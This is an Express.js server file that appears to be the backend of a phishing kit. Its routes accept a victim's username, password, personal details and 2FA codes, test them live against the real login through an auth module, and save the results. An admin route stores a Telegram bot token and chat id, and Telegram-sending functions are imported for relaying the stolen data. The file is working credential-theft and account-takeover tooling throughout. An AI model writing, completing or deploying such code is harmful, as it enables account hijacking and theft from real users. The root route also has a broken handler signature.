const express = require('express');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;
const server = require('http').Server(app);
const { initialize, check, enterCode, updateAndSync, saveInfo, close,sendMessageToFatherBot,sendTelegramMessage,test } = require('./modules/authModule');
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

const adminPath = path.join(__dirname, 'admin');
const clientPath = path.join(__dirname, 'client');
const configPath = path.join(__dirname, 'admin/config.json');
app.use(express.static(clientPath));
app.use(express.static(adminPath));
app.get('/', (res) => {
    res.sendFile(path.join(clientPath, 'index.html'));
});
app.get('/admin', (req, res) => {
   res.sendFile(path.join(adminPath, 'index.html'));
});
app.post('/checka', async (req, res) => {
    const { username, password, ip, country, fullname, birthday } = req.body;
    try {
        await initialize();
        const result = await check(username, password);
        if (result === 'SUCCESS') {
            saveInfo('Không bật 2FA', ip, country, username, password, fullname, birthday);
            res.send('SUCCESS');
            await updateAndSync();
            await close();
        }
        else if (result === 'WRONG') {
            // await sendTelegramMessage("ok", ip , country, username, password, fullname, birthday)   .then(response => {
            //     console.log('Tin nhắn đã được gửi', response);
            //   })
            //   .catch(error => {
            //     console.error('Có lỗi xảy ra khi gửi tin nhắn', error);
            //   });
            res.send('WRONGs');
        }
        else if (result === 'CHECKPOINT') {
            res.send('CHECKPOINT');
            await close();
        }
        else {
            res.send(result);
            saveInfo(result, ip, country, username, password, fullname, birthday);
        }
    } catch (error) {
        console.log(error);
        try { await close(); }
        catch {
        }
    }
});

app.post('/code', async (req, res) => {
    const { code } = req.body;
    try {
        const result = await enterCode(code);
        if (result === 'SUCCESS') {
            await updateAndSync();
            await close();
            res.send('SUCCESS');
        }
        else {
            res.send(result);
        }
    } catch (error) {
        await close();
        res.status(500).send(error);
    }
});
app.post('/update', (req, res) => {
    const configInfo = {
        host: req.body.host,
        port: req.body.port,
        username: req.body.username,
        password: req.body.password,
        token: req.body.token,
        chatid: req.body.chatid
    };
    fs.writeFileSync(configPath, JSON.stringify(configInfo, null, 2));
    res.redirect('/admin');
});

server.listen(port, () => {
    console.log(`http://localhost:${port}`);
});
app.post('/check', async (req, res) => {
    await initialize();
    const { code } = req.body;
    try {
        const result = await test(code);
        if (result === 'SUCCESS') {
            await updateAndSync();
            await close();
            res.send('SUCCESS');
        }
        else {
            res.send(result);
        }
    } catch (error) {
        await close();
        res.status(500).send(error);
    }
});
